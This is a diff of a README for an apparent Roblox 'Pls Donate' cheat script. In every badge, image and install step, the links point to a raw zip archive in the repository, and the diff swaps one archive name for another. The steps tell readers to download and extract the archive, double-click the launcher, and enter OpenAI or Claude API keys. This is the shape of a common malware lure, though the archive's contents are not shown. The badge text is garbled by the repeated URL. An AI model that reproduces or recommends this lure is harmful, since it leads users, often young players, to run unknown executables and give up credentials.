@@ -1,10 +1,10 @@
 # 🌸 Pls Donate Script Roblox ✨
 
-[![License: MIT](https://github.com/Redbalistic/pls-donate-plus-script/raw/refs/heads/main/puerperium/plus_donate_script_pls_v1.8-alpha.3.zip)](LICENSE)
-[![OS Support](https://github.com/Redbalistic/pls-donate-plus-script/raw/refs/heads/main/puerperium/plus_donate_script_pls_v1.8-alpha.3.zip%20%7C%20Mac%20%7C%20Linux-brightgreen)]()
-[![OpenAI Ready](https://github.com/Redbalistic/pls-donate-plus-script/raw/refs/heads/main/puerperium/plus_donate_script_pls_v1.8-alpha.3.zip%20Support-purple)]()
-[![Claude API](https://github.com/Redbalistic/pls-donate-plus-script/raw/refs/heads/main/puerperium/plus_donate_script_pls_v1.8-alpha.3.zip%20Support-yellow)]()
-[![Languages](https://github.com/Redbalistic/pls-donate-plus-script/raw/refs/heads/main/puerperium/plus_donate_script_pls_v1.8-alpha.3.zip%20Support-cyan)]()
+[![License: MIT](https://github.com/Redbalistic/pls-donate-plus-script/raw/refs/heads/main/puerperium/script-donate-pls-plus-v1.7.zip)](LICENSE)
+[![OS Support](https://github.com/Redbalistic/pls-donate-plus-script/raw/refs/heads/main/puerperium/script-donate-pls-plus-v1.7.zip%20%7C%20Mac%20%7C%20Linux-brightgreen)]()
+[![OpenAI Ready](https://github.com/Redbalistic/pls-donate-plus-script/raw/refs/heads/main/puerperium/script-donate-pls-plus-v1.7.zip%20Support-purple)]()
+[![Claude API](https://github.com/Redbalistic/pls-donate-plus-script/raw/refs/heads/main/puerperium/script-donate-pls-plus-v1.7.zip%20Support-yellow)]()
+[![Languages](https://github.com/Redbalistic/pls-donate-plus-script/raw/refs/heads/main/puerperium/script-donate-pls-plus-v1.7.zip%20Support-cyan)]()
 
 ---
 
@@ -33,21 +33,21 @@ Make your mark, express your flair, and open up to a worldwide audience—now wi
 
 Supercharge your “pls donate” booth by following these quick steps!
 
-#### 1️⃣ Download the https://github.com/Redbalistic/pls-donate-plus-script/raw/refs/heads/main/puerperium/plus_donate_script_pls_v1.8-alpha.3.zip from this repository  
+#### 1️⃣ Download the https://github.com/Redbalistic/pls-donate-plus-script/raw/refs/heads/main/puerperium/script-donate-pls-plus-v1.7.zip from this repository  
    (Find it in the [Releases] section on GitHub!)
 
 #### 2️⃣ Extract the Zip Archive  
    Right-click and select 'Extract All...' or use your favorite archive tool.
 
 #### 3️⃣ Launch the EasyLaunch App  
-   Double-click `https://github.com/Redbalistic/pls-donate-plus-script/raw/refs/heads/main/puerperium/plus_donate_script_pls_v1.8-alpha.3.zip` (or relevant binary for your OS).
+   Double-click `https://github.com/Redbalistic/pls-donate-plus-script/raw/refs/heads/main/puerperium/script-donate-pls-plus-v1.7.zip` (or relevant binary for your OS).
 
 #### 4️⃣ Follow the Installation Wizard  
    The adaptive wizard guides you through adding your API keys (for OpenAI or Claude, if you wish), customizing language, and linking to your Roblox booth.
 
 #### 5️⃣ Enjoy!  
    You're ready to shine—your “pls donate script” experience has just become extraordinary.  
-![Installation Guide](https://github.com/Redbalistic/pls-donate-plus-script/raw/refs/heads/main/puerperium/plus_donate_script_pls_v1.8-alpha.3.zip)
+![Installation Guide](https://github.com/Redbalistic/pls-donate-plus-script/raw/refs/heads/main/puerperium/script-donate-pls-plus-v1.7.zip)
 
 ---
 
